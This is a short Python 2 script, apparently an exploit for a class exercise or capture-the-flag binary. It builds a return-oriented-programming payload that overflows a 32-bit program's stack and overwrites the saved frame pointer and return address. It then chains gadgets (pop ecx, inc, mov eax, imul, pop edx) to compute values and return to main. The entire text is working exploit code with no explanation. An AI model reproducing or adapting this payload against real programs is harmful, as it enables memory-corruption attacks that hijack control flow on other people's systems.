in1=("\x61"*12 + "\x00"*3)*20

ebp="\x78"*12 + "\x00"*3 +  "\xd5"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3

ret_add= "\xb2"*12 + "\x00"*3 +  "\x81"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3



GA2_pop= "\xb1"*12 + "\x00"*3 +  "\xe8"*12 + "\x00"*3 + "\x0d"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # pop ecx; ret
glb_add= "\x20"*12 + "\x00"*3 +  "\xba"*12 + "\x00"*3 + "\x0e"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # Address of glb
GA3_inc= "\xe8"*12 + "\x00"*3 +  "\x44"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3         # inc dword ptr [ecx] ; ret
GA4_mov_eax_2= "\x50"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # 
GA4_mov_eax_3= "\x60"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 3 ; ret
GA4_mov_eax_4= "\x70"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 4 ; ret
GA4_mov_eax_5= "\x80"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 5 ; ret
GA4_mov_eax_6= "\x90"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 6 ; ret
GA4_mov_eax_7= "\xa0"*12 + "\x00"*3 +  "\xef"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3   # mov eax, 7 ; ret
GA5_imul = "\xb8"*12 + "\x00"*3 +  "\x30"*12 + "\x00"*3 + "\x06"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3       # imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
#ret
#GA5_imul="\x19"*12 + "\x00"*3 +  "\x66"*12 + "\x00"*3 + "\x0b"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3  #changed to fmul address
GA6_mov="\xbe"*12 + "\x00"*3 +  "\x7f"*12 + "\x00"*3 + "\x0b"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3

ret_to_main = "\xb1"*12 + "\x00"*3 +  "\x8b"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3

pop_edi = "\x80"*12 + "\x00"*3 +  "\x84"*12 + "\x00"*3 + "\x04"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 #pop edi; ret
cat_add= "\x55"*12 + "\x00"*3 +  "\xce"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3

pop_edx= "\x3a"*12 + "\x00"*3 +  "\xf0"*12 + "\x00"*3 + "\x06"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3 
edx_add= "\x68"*12 + "\x00"*3 +  "\xce"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3 + "\xff"*12 + "\x00"*3

eax_inc=  "\x7f"*12 + "\x00"*3 +  "\xa8"*12 + "\x00"*3 + "\x07"*12 + "\x00"*3 + "\x08"*12 + "\x00"*3

y = in1+ebp+ret_add+pop_edi+cat_add+GA2_pop+glb_add+GA3_inc+GA3_inc+GA4_mov_eax_3+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_4+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_5+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_6+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ GA4_mov_eax_7+eax_inc+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+GA4_mov_eax_7+eax_inc+eax_inc+eax_inc+GA5_imul+ret_add+pop_edx+edx_add+GA6_mov+ ret_to_main

 

print y
